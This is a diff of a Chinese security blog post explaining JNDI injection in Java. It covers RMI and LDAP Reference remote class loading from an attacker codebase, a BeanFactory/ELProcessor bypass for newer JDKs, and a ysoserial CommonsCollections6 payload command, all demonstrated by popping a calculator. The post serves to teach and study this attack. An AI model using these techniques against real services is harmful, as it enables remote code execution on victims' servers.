@@ -19,12 +19,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="JNDI专题 简介 JNDI是什么 **JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务">
+    <meta name="description" content="JNDI专题 简介 JNDI是什么  **JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JNDI专题">
 <meta property="og:url" content="http://curlysean.github.io/2025/03/08/JNDI%E4%B8%93%E9%A2%98/index.html">
 <meta property="og:site_name" content="肖恩的博客">
-<meta property="og:description" content="JNDI专题 简介 JNDI是什么 **JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务">
+<meta property="og:description" content="JNDI专题 简介 JNDI是什么  **JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736589928418-eeea02a8-f39b-47f5-b206-255ddc93955e.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736592223285-925e1da9-5d1e-4723-8b64-f446cfd067ae.png">
@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401357575-539ecba6-7ce2-41a2-9ff2-5e8c2f423490.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401466693-3ec57d1b-642c-460d-8d14-274dc995b47f.png">
 <meta property="article:published_time" content="2025-03-08T03:02:29.770Z">
-<meta property="article:modified_time" content="2025-03-08T03:05:04.916Z">
+<meta property="article:modified_time" content="2025-03-24T04:26:56.966Z">
 <meta property="article:author" content="Sean">
 <meta property="article:tag" content="JNDI">
 <meta name="twitter:card" content="summary">
@@ -161,6 +161,8 @@
 
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">Sean</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -168,7 +170,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -179,7 +181,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -209,7 +211,7 @@
     <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/08/JNDI%E4%B8%93%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="Sean">
     </span>
 
@@ -234,9 +236,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-08 11:02:29 / 修改时间：11:05:04" itemprop="dateCreated datePublished" datetime="2025-03-08T11:02:29+08:00">2025-03-08</time>
+      <time title="创建时间：2025-03-08 11:02:29" itemprop="dateCreated datePublished" datetime="2025-03-08T11:02:29+08:00">2025-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-24 12:26:56" itemprop="dateModified" datetime="2025-03-24T12:26:56+08:00">2025-03-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -267,13 +275,13 @@
     <div class="post-body" itemprop="articleBody"><h1 id="f9scM">JNDI专题</h1>
 <h2 id="LdYqz">简介</h2>
 <h3 id="XvDGy">JNDI是什么</h3>
-**JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。
 
+<p>**JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>
 <p>简单来说就是一个索引库，将一个名称对应到一个对象（或者属性）上面，并且可以通过指定名称找到相应对象</p>
 <p><strong>作用：可以实现动态加载数据库配置文件，从而保持数据库代码不变动等</strong></p>
 <h3 id="hMIZu">结构</h3>
-JDNI包含在JavaSE平台中。要使用JNDI，必须拥有JNDI类和一个或者多个服务器提供者。JDK包括以下命名/目录服务的提供者：
 
+<p>JDNI包含在JavaSE平台中。要使用JNDI，必须拥有JNDI类和一个或者多个服务器提供者。JDK包括以下命名&#x2F;目录服务的提供者：</p>
 <ul>
 <li>轻量级目录访问协议（LDAP）</li>
 <li>通过对象请求代理架构（CORBA）通过对象服务（COS）名称服务</li>
@@ -326,8 +334,8 @@ JDNI包含在JavaSE平台中。要使用JNDI，必须拥有JNDI类和一个或�
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(className);</span><br><span class="line">        classFactory = factory;</span><br><span class="line">        classFactoryLocation = factoryLocation;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="leUiH">实现</h3>
-来看一下它的实现，创建一个引用对象，将TestRef类和TestRef工厂绑定到`http://localhost:7777`下面，再将**引用对象**绑定到`rmi://localhost:1099/remoteObj`中
 
+<p>来看一下它的实现，创建一个引用对象，将TestRef类和TestRef工厂绑定到<code>http://localhost:7777</code>下面，再将<strong>引用对象</strong>绑定到<code>rmi://localhost:1099/remoteObj</code>中</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://127.0.0.1:1099/remoteObj&quot;,new RemoteObjImpl());</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,refObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们这里构造一个恶意类，写入可以弹出计算器的恶意代码</p>
@@ -341,8 +349,8 @@ JDNI包含在JavaSE平台中。要使用JNDI，必须拥有JNDI类和一个或�
 <p>最终成功弹出计算机</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736597825736-6b8ac8f4-9a3b-4adb-9ffc-934b1f8fab53.png"></p>
 <h4 id="DDBMN">小tip</h4>
-由于调用恶意类的构造函数实在客户端（被攻击端）上执行，所以在编译时候，恶意类的开头不可以带`package`，否则会报出`NoClassDefFoundError`错误。
 
+<p>由于调用恶意类的构造函数实在客户端（被攻击端）上执行，所以在编译时候，恶意类的开头不可以带<code>package</code>，否则会报出<code>NoClassDefFoundError</code>错误。</p>
 <h3 id="Oa7Ym">流程分析</h3>
 其中具体的流程我们也来跟一下
 
@@ -420,8 +428,8 @@ LDAP不是java的东西，而是一个通用协议
 <p>将LDAP客户端运行起来，就成功弹出了计算器</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742972042-dcf6e9a9-ed0f-4e5d-a175-2454b7d0a6a1.png"></p>
 <h3 id="vVqbv">分析</h3>
-经过一系列的`lookup`调用，最终走到了`LdapCtx#c_lookup`中，通过调用`DirectoryManager.getObjectInstance`，走出协议对应的类
 
+<p>经过一系列的<code>lookup</code>调用，最终走到了<code>LdapCtx#c_lookup</code>中，通过调用<code>DirectoryManager.getObjectInstance</code>，走出协议对应的类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">c_lookup</span><span class="params">(Name var1, Continuation var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        var2.setError(<span class="built_in">this</span>, var1);</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> DirectoryManager.getObjectInstance(var3, var1, <span class="built_in">this</span>, <span class="built_in">this</span>.envprops, (Attributes)var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2.fillInException(var16);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var24</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;problem generating object using object factory&quot;</span>);</span><br><span class="line">            var24.setRootCause(var17);</span><br><span class="line">            <span class="keyword">throw</span> var2.fillInException(var24);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>走入<code>DirectoryManager#getObjectInstance</code>后，我们发现和rmi的的后半段是基本一样的，进入<code>getObjectFactoryFromReference</code></p>
@@ -433,8 +441,8 @@ LDAP不是java的东西，而是一个通用协议
 <h2 id="nNAiJ">JDK高版本绕过</h2>
 <h3 id="WRK3l">JDK8u191之后</h3>
 <h4 id="RW8TM">本地恶意CLass绕过</h4>
-在jdk8u191后，LDAP已经修复，在进行codebase远程类加载时候，添加了一个限制条件
 
+<p>在jdk8u191后，LDAP已经修复，在进行codebase远程类加载时候，添加了一个限制条件</p>
 <p>如果<code>trustURLCodebase</code>为true时，才能进行远程类加载</p>
 <p>更换高版本后，原来的给攻击既不弹计算器，也不会报错</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736748651382-30f900c0-794e-4719-885b-944e33751a82.png"></p>
@@ -454,8 +462,8 @@ LDAP不是java的东西，而是一个通用协议
 
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741399917776-e14d0309-fcfd-4f4e-8bfb-dcda444ba8dc.png"></p>
 <h5 id="yvE8v">分析</h5>
-与前面的调用相类似，经过一些`lookup`方法的调用，和`decodeObject`方法过后，走到`NamingManager#getObjectInstance`中，执行`getObjectFactoryFromReference`方法
 
+<p>与前面的调用相类似，经过一些<code>lookup</code>方法的调用，和<code>decodeObject</code>方法过后，走到<code>NamingManager#getObjectInstance</code>中，执行<code>getObjectFactoryFromReference</code>方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>在这个方法中，首先会在本地进行类加载，与之前的不同，这次可以在本地找到<code>BeanFactory</code>,即可在本地进行加载，最后return时候进行实例化，我们即可获得一个<code>BeanFactory</code>类</p>
@@ -475,8 +483,8 @@ LDAP不是java的东西，而是一个通用协议
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401357575-539ecba6-7ce2-41a2-9ff2-5e8c2f423490.png">获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即<code>javax.el.ELProcessor</code>类的<code>eval()</code>方法并赋值给method变量，最后就是通过<code>method.invoke()</code>即反射调用的来执行</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401466693-3ec57d1b-642c-460d-8d14-274dc995b47f.png"></p>
 <h4 id="n52C0">LDAP返回序列化数据，触发本地Target</h4>
-LDAP除了支持JNDI Reference这种利用方法，还支持直接返回一个序列化的对象，若Java对象的javaSerializedData属性不为空，则客户端的`obj.decodeObject()`方法就会最这个字段的内容进行反序列化
 
+<p>LDAP除了支持JNDI Reference这种利用方法，还支持直接返回一个序列化的对象，若Java对象的javaSerializedData属性不为空，则客户端的<code>obj.decodeObject()</code>方法就会最这个字段的内容进行反序列化</p>
 <p>若服务端的ClassPath中存在反序列化利用点的Gadget，例如CC依赖等等，就可以实现LDAP结合该Garget实现反序列化漏洞攻击</p>
 <p>我们这里使用CC6来实现攻击</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master.jar CommonsCollections6 <span class="string">&#x27;calc&#x27;</span> | base64</span><br></pre></td></tr></table></figure>
@@ -536,7 +544,6 @@ LDAP除了支持JNDI Reference这种利用方法，还支持直接返回一个�
     </footer>
   </article>
 </div>
-
 
 
 
